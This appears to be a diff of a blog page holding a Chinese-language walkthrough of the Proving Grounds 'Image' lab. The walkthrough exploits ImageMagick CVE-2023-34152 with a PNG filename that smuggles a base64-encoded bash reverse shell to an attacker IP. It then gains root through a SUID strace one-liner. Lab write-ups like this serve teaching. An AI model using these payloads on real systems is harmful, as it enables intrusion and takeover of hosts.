@@ -162,9 +162,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
+    <input autocomplete="off" autocapitalize="off" placeholder="Searching..." spellcheck="false" type="search" class="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -206,7 +204,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="Yiaos">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content>
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -272,7 +270,7 @@
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NGZjZjQ1NmJiNDM3YzZhNDVlNTA3ZjFlZWIxNjNjYWFfSUFaMHBEc0dmWmpxVkw0amQydXpNRGJDS3lqVTdTZ3JfVG9rZW46S1ZMZWJqYkJlb1E1TGh4cUFZZmNUVlBobmdiXzE3Mzk3MDI2OTQ6MTczOTcwNjI5NF9WNA"></p>
 <h1 id="foothold"><a href="#foothold" class="headerlink" title="foothold"></a>foothold</h1><p>google搜索 <code>imagemagick 6.9.6 exploit</code></p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjRjYzMyZmEyNjY1ZjI5ZTBiODdlYzU2ZmY3OWU0YTZfbVhCTk94NTFBaVNQVzJCTllpOEhEbVBadVB2Sk9hZG1fVG9rZW46S216dGJBOGxwb1praUJ4RWNFMmNraUhabjRjXzE3Mzk3MDI2OTQ6MTczOTcwNjI5NF9WNA"></p>
-<p> <a target="_blank" rel="noopener" href="https://github.com/ImageMagick/ImageMagick/issues/6339">https://github.com/ImageMagick/ImageMagick/issues/6339</a></p>
+<p> <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/ImageMagick/ImageMagick/issues/6339">https://github.com/ImageMagick/ImageMagick/issues/6339</a></p>
 <p>issue中提到 <code>CVE-2023-34152</code> 再次搜索找到github: <code>https://github.com/overgrowncarrot1/ImageTragick_CVE-2023-34152</code>,克隆代码执行, 生成两个图片文件</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ ls</span><br><span class="line"> base.txt           &#x27;|en<span class="string">&quot;`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC84MCAwPiYxCg==&#x27;$&#x27;\n&#x27;&#x27; | base64 -d | bash`&quot;</span>.png&#x27;   README.md</span><br><span class="line"> CVE<span class="number">-2023</span><span class="number">-34152.</span>py   en.png  </span><br></pre></td></tr></table></figure>
 
@@ -282,7 +280,7 @@
 <h1 id="escalation"><a href="#escalation" class="headerlink" title="escalation"></a>escalation</h1><p>下载linpeas并执行, 发现strace suid权限, gtfobins查找利用方式 <code>/usr/bin/strace -o /dev/null /bin/sh -p</code>提权成功</p>
 <p><img src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTgzMmJjNzIxOGFjNGNkOTBmYTljYzJiZjM0YmFmZWFfSjFTcVY3WjRSMzByeVN4M05ZdWp3WDc0b3lERHR6MnpfVG9rZW46TmJ1VmJnUUQwb0o0Z1J4RG91dWNXenNBbjhnXzE3Mzk3MDI2OTQ6MTczOTcwNjI5NF9WNA"></p>
 <blockquote>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/strace/">https://gtfobins.github.io/gtfobins/strace/</a></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gtfobins.github.io/gtfobins/strace/">https://gtfobins.github.io/gtfobins/strace/</a></p>
 </blockquote>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@image<span class="punctuation">:</span>/var/www/html$ /usr/bin/strace -o /dev/<span class="literal"><span class="keyword">null</span></span> /bin/sh -p</span><br><span class="line">/usr/bin/strace -o /dev/<span class="literal"><span class="keyword">null</span></span> /bin/sh -p</span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)<span class="punctuation">,</span><span class="number">33</span>(www-data)</span><br><span class="line">cd /root</span><br><span class="line">ls</span><br><span class="line">ImageMagick<span class="number">-7.1</span><span class="number">.0</span><span class="number">-16</span></span><br><span class="line">email2.txt</span><br><span class="line">proof.txt</span><br><span class="line">snap</span><br><span class="line">cat proof.txt</span><br><span class="line"><span class="number">056</span>bd9764a79f6e07150768696acf296</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 
@@ -303,7 +301,7 @@
     <a href="https://thiiiiink.com/post/20250216184512.html" title="Proving Grounds Practice - Image">https://thiiiiink.com/post/20250216184512.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
   </li>
 </ul>
 </div>
@@ -399,11 +397,11 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+        <a href="https://github.com/yiaos" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yiaos" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
   </div>
   <div class="cc-license motion-element" itemprop="license">
-    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="external nofollow noopener noreferrer" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
   </div>
 
 
